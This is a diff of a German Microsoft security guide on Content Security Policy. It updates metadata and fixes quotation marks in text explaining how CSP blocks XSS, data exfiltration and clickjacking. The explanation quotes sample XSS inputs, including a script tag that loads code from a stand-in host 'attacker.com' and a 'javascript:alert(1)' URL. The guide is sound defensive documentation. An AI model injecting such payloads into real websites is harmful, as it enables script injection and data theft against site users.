@@ -15,12 +15,12 @@ ms.devlang: na
 ms.topic: article
 ms.date: 02/07/2017
 ms.author: jegeib
-ms.openlocfilehash: 986bed758229d639bb40d0803f7be4a89a0f6e49
-ms.sourcegitcommit: 13a289ba57cfae728831e6d38b7f82dae165e59d
+ms.openlocfilehash: fedf8118f5581056e40594419c17f074c339a61b
+ms.sourcegitcommit: 0b1a4101d575e28af0f0d161852b57d82c9b2a7e
 ms.translationtype: HT
 ms.contentlocale: de-DE
-ms.lasthandoff: 08/09/2019
-ms.locfileid: "68934808"
+ms.lasthandoff: 10/30/2019
+ms.locfileid: "73161541"
 ---
 # <a name="security-frame-configuration-management--mitigations"></a>Sicherheitskonzept: Konfigurationsverwaltung | Risikominderung 
 | Produkt/Dienst | Artikel |
@@ -44,7 +44,7 @@ ms.locfileid: "68934808"
 | **Zutreffende Technologien** | Allgemein |
 | **Attribute**              | N/V  |
 | **Referenzen**              | [An Introduction to Content Security Policy](https://www.html5rocks.com/en/tutorials/security/content-security-policy/) (Eine Einführung in die Inhaltssicherheitsrichtlinie), [Content Security Policy Reference](https://content-security-policy.com/) (Referenz für die Inhaltssicherheitsrichtlinie), [Security features](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/) (Sicherheitsfeatures), [Introduction to content security policy](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy) (Einführung in die Inhaltssicherheitsrichtlinie), [Can I use CSP?](https://caniuse.com/#feat=contentsecuritypolicy) (Kann ich die Inhaltssicherheitsrichtlinie verwenden?) |
-| **Schritte** | <p>Die Inhaltssicherheitsrichtlinie (Content Security Policy, CSP) ist ein umfassender defensiver Sicherheitsmechanismus – ein W3C-Standard, mit dem Besitzer von Webanwendungen den in Ihre Website eingebetteten Inhalt steuern können. CSP wird auf dem Webserver als HTTP-Antwortheader hinzugefügt und clientseitig vom Browser erzwungen. Die Richtlinie basiert auf einer Positivliste: Eine Website kann einen Satz vertrauenswürdiger Domänen deklarieren, aus denen aktive Inhalte wie etwa JavaScript geladen werden können.</p><p>CSP bietet folgende Sicherheitsvorteile:</p><ul><li>**Schutz vor XSS**:  Wenn eine Seite für XSS anfällig ist, kann dies von einem Angreifer auf zwei Arten ausgenutzt werden:<ul><li>Der Angreifer kann `<script>malicious code</script>` einschleusen. Dieser Exploit funktioniert dank der Basiseinschränkung 1 von CSP nicht.</li><li>Der Angreifer kann `<script src=”http://attacker.com/maliciousCode.js”/>` einschleusen. Dieser Exploit funktioniert nicht, da die vom Angreifer gesteuerte Domäne nicht in der CSP-Positivliste mit zulässigen Domänen enthalten ist.</li></ul></li><li>**Kontrolle über die Ausschleusung von Daten**: Wenn schädlicher Inhalt auf einer Webseite versucht, eine Verbindung mit einer externen Website herzustellen und Daten zu stehlen, wird die Verbindung von CSP getrennt. Der Grund: Die Zieldomäne ist nicht in der Positivliste von CSP enthalten.</li><li>**Schutz vor Clickjacking:** Bei einem Clickjacking-Angriff kann ein Angreifer eine Originalwebsite mit einem Frame versehen und Benutzer zum Klicken auf Benutzeroberflächenelemente bewegen. Zum Schutz vor Clickjacking wird momentan ein Antwortheader mit X-Frame-Optionen konfiguriert. Dieser Header wird nicht von allen Browsern beachtet, und in Zukunft wird CSP als eine der Standardmaßnahmen gegen Clickjacking verwendet.</li><li>**Echtzeitberichte zu Angriffen**: Bei einem Einschleusungsangriff auf eine CSP-fähige Website benachrichtigt der Browser automatisch einen für den Webserver konfigurierten Endpunkt. Somit fungiert CSP als Echtzeitwarnsystem.</li></ul> |
+| **Schritte** | <p>Die Inhaltssicherheitsrichtlinie (Content Security Policy, CSP) ist ein umfassender defensiver Sicherheitsmechanismus – ein W3C-Standard, mit dem Besitzer von Webanwendungen den in Ihre Website eingebetteten Inhalt steuern können. CSP wird auf dem Webserver als HTTP-Antwortheader hinzugefügt und clientseitig vom Browser erzwungen. Die Richtlinie basiert auf einer Positivliste: Eine Website kann einen Satz vertrauenswürdiger Domänen deklarieren, aus denen aktive Inhalte wie etwa JavaScript geladen werden können.</p><p>CSP bietet folgende Sicherheitsvorteile:</p><ul><li>**Schutz vor XSS**:  Wenn eine Seite für XSS anfällig ist, kann dies von einem Angreifer auf zwei Arten ausgenutzt werden:<ul><li>Der Angreifer kann `<script>malicious code</script>` einschleusen. Dieser Exploit funktioniert dank der Basiseinschränkung 1 von CSP nicht.</li><li>Der Angreifer kann `<script src="http://attacker.com/maliciousCode.js"/>` einschleusen. Dieser Exploit funktioniert nicht, da die vom Angreifer gesteuerte Domäne nicht in der CSP-Positivliste mit zulässigen Domänen enthalten ist.</li></ul></li><li>**Kontrolle über die Ausschleusung von Daten**: Wenn schädlicher Inhalt auf einer Webseite versucht, eine Verbindung mit einer externen Website herzustellen und Daten zu stehlen, wird die Verbindung von CSP getrennt. Der Grund: Die Zieldomäne ist nicht in der Positivliste von CSP enthalten.</li><li>**Schutz vor Clickjacking:** Bei einem Clickjacking-Angriff kann ein Angreifer eine Originalwebsite mit einem Frame versehen und Benutzer zum Klicken auf Benutzeroberflächenelemente bewegen. Zum Schutz vor Clickjacking wird momentan ein Antwortheader mit X-Frame-Optionen konfiguriert. Dieser Header wird nicht von allen Browsern beachtet, und in Zukunft wird CSP als eine der Standardmaßnahmen gegen Clickjacking verwendet.</li><li>**Echtzeitberichte zu Angriffen**: Bei einem Einschleusungsangriff auf eine CSP-fähige Website benachrichtigt der Browser automatisch einen für den Webserver konfigurierten Endpunkt. Somit fungiert CSP als Echtzeitwarnsystem.</li></ul> |
 
 ### <a name="example"></a>Beispiel
 Beispielrichtlinie: 
@@ -57,7 +57,7 @@ Bei dieser Richtlinie können Skripts nur vom Server der Webanwendung und vom Go
 Es werden keine Inlineskripts ausgeführt. Beispiele für Inlineskripts: 
 ```javascript
 <script> some Javascript code </script>
-Event handling attributes of HTML tags (e.g., <button onclick=”function(){}”>
+Event handling attributes of HTML tags (e.g., <button onclick="function(){}">
 javascript:alert(1);
 ```
 
